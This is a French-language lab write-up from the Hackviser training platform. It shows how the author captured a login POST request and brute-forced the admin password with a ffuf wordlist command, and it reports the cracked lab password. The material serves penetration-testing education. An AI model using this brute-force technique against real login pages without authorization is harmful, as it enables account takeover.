[[Hackviser Lab]]

une description du lab 
![[Pasted image 20260915140335.png]] 
une des prmeires  informations qu'on a c'est que il esxiste un user admin , une grosse épine du pied enlevé maintenant le mot de passe

essayons un mot de passe arbitraire pour examen de la requète envoyer 

![[Pasted image 20260915140828.png]]

une fois les creds envoyés on a ces requètes : 

![[Pasted image 20260915140913.png]]
c'est la requete POST en violet qui  nous interesse pourquoi ? c'est elle qui établit un protocole formelle d'envoie de nos credentials  

quands on clique dessus sur la partie headers on a  : 

```HTTP
POST /login.php HTTP/1.1
Host: native-shotgun.europe1.hackviser.space
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br, zstd
Referer: https://native-shotgun.europe1.hackviser.space/login.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 27
Origin: https://native-shotgun.europe1.hackviser.space
DNT: 1
Connection: keep-alive
Cookie: PHPSESSID=vdag2nbfon4dan29g6a3od7kcg
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Sec-GPC: 1
Priority: u=0, i

username=admin&password=ok+
```

donc  les crédentials envoyé sont sous se format username=admin&password=ok+ et sont encodé en format url 

donc notre but est de partir de cette basse  et d'éssayer plusieurs mot de passe pour voir le-quel passe  
pour le mot de passe on va utiliser l'outil ffuf pour notre  besoin 

la commande générale pour ce cas  est : 

```bash 
ffuf -u $url -X POST -d "username=admin&password=FUZZ" -H "Content-Type: application/x-www-form-urlencoded" -w /chemin/vers/ta/wordlist
```
-u : spécifie l'urll à utilisé 
-X c'est la méthode utilisé pour l'envoi des données 
-d c'est la spécification des données à envoiyées 
-H permet d'ajouter une entete HTTP à la requète initila 
-w spécifie le chemin vers la wordlist qui sera utiliser pour trouver le mot de passe 


![[Pasted image 20260915142102.png]]

on a un possible mot de passe : superman on essai sa pour voir :

![[Pasted image 20260915142200.png]]

le mot de passe est validé 
GG
